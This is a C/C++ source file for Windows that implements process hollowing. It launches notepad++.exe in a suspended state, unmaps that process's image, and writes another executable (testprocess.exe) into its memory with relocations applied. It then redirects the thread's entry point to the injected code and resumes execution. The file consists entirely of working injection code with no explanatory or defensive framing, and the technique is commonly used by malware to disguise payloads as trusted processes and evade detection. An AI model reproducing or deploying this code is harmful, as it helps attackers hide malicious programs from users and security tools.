#include <stdio.h>
#include <Windows.h>

#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);

typedef struct BASE_RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;


int main() {

    LPSTARTUPINFOA victimSI = new STARTUPINFOA();
    LPPROCESS_INFORMATION victimPI = new PROCESS_INFORMATION();
    char victim[MAX_PATH]; 
    GetFullPathNameA("notepad++.exe", MAX_PATH , (LPSTR)victim, NULL);
    char testprocess[MAX_PATH];
    GetFullPathNameA("testprocess.exe", MAX_PATH, (LPSTR)testprocess, NULL);
    CreateProcessA(0, (LPSTR)victim, 0, 0, 0, CREATE_SUSPENDED, 0, 0, victimSI, victimPI);

    printf("PID victim process %i\r\n", victimPI->dwProcessId);

    HANDLE htestprocess = CreateFileA(testprocess, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
    DWORD testprocessSize = GetFileSize(htestprocess, 0);
    LPDWORD fileBytesRead = 0;
    SIZE_T bytesRead = NULL;
    printf("Size: %i bytes (testprocess)\r\n", testprocessSize);

	LPVOID ptestprocess = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, testprocessSize);
    DWORD totalNumberofBytesRead;
    ReadFile(htestprocess, ptestprocess, testprocessSize, &totalNumberofBytesRead, 0);
    CloseHandle(htestprocess);

    printf("In process: 0x%08x\r\n", (UINT)ptestprocess);

    CONTEXT victimContext;
    victimContext.ContextFlags = CONTEXT_FULL;
    DWORD a = GetThreadContext(victimPI->hThread, &victimContext);
    if (!a) {
        printf("hello1");
    }
    printf("Victim PEB address: 0x%08x\r\n", (UINT)victimContext.Ebx);
    printf("Victim entry point: 0x%08x\r\n", (UINT)victimContext.Eax);

    PVOID pvictimBaseAddress;
    ReadProcessMemory(victimPI->hProcess, (PVOID)(victimContext.Ebx + 8), &pvictimBaseAddress, sizeof(PVOID), 0);

    printf("Image base address: 0x%08x (victim process)\r\n", (UINT)pvictimBaseAddress);
    NtUnmapViewOfSection(victimPI->hProcess, pvictimBaseAddress);
   
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ptestprocess;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((LPBYTE)ptestprocess + dosHeader->e_lfanew);
    DWORD testprocessBaseAddress = ntHeader->OptionalHeader.ImageBase;
    DWORD sizeOftestprocess = ntHeader->OptionalHeader.SizeOfImage;

    printf("Image base address: 0x%08x (testprocess)\r\n", (UINT)testprocessBaseAddress);
    printf("Testprocess entry point: 0x%08x\r\n", (UINT)ntHeader->OptionalHeader.AddressOfEntryPoint);

    PVOID pvictim = VirtualAllocEx(victimPI->hProcess, (PVOID)pvictimBaseAddress, sizeOftestprocess, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    DWORD deltaImageBase = (DWORD)pvictim - ntHeader->OptionalHeader.ImageBase;
    printf("Victim memory: 0x%08x\r\n", (UINT)pvictim);
    ntHeader->OptionalHeader.ImageBase = (DWORD)pvictim;
    WriteProcessMemory(victimPI->hProcess, (PVOID)pvictim, ptestprocess, ntHeader->OptionalHeader.SizeOfHeaders, 0);

    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)ptestprocess + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
        WriteProcessMemory(victimPI->hProcess, (PVOID)((LPBYTE)pvictim + sectionHeader->VirtualAddress), (PVOID)((LPBYTE)ptestprocess + sectionHeader->PointerToRawData), sectionHeader->SizeOfRawData, 0);

        printf("Section %s: 0x%08x\r\n", sectionHeader->Name, (UINT)pvictim + sectionHeader->VirtualAddress);
    }

    IMAGE_DATA_DIRECTORY relocationTable = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    printf("DeltaImageBase : 0x%08x\r\n", (UINT)deltaImageBase);

    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
    {
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)ptestprocess + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
        BYTE* relocSectionName = (BYTE*)".reloc";
        if (memcmp(sectionHeader->Name, relocSectionName, 5) != 0)
        {
            continue;
        }
        DWORD relocationOffset = 0;
        while (relocationOffset < relocationTable.Size) {
            PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)ptestprocess + sectionHeader->PointerToRawData + relocationOffset);
            relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
            DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
            PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((DWORD)ptestprocess + sectionHeader->PointerToRawData + relocationOffset);
            for (DWORD y = 0; y < relocationEntryCount; y++)
            {
                relocationOffset += sizeof(BASE_RELOCATION_ENTRY);
                if (relocationEntries[y].Type == 0)
                {
                    continue;
                }
                DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset;
                DWORD patchedBuffer = 0;
                ReadProcessMemory(victimPI->hProcess, (LPCVOID)((DWORD)pvictim + patchAddress), &patchedBuffer, sizeof(DWORD), &bytesRead);
                patchedBuffer += deltaImageBase;
                WriteProcessMemory(victimPI->hProcess, (PVOID)((DWORD)pvictim + patchAddress), &patchedBuffer, sizeof(DWORD), fileBytesRead);
            }
        }
    }
    LPCONTEXT context = new CONTEXT();
    context->ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(victimPI->hThread, context);

    victimContext.Eax = (SIZE_T)((LPBYTE)pvictim + ntHeader->OptionalHeader.AddressOfEntryPoint);
    SetThreadContext(victimPI->hThread, &victimContext);
    printf("Victim entry point: 0x%08x\r\n", (UINT)pvictim + ntHeader->OptionalHeader.AddressOfEntryPoint);
    ResumeThread(victimPI->hThread);
    CloseHandle(victimPI->hThread);
    CloseHandle(victimPI->hProcess);
    VirtualFree(ptestprocess, 0, MEM_RELEASE);
    return 0;
}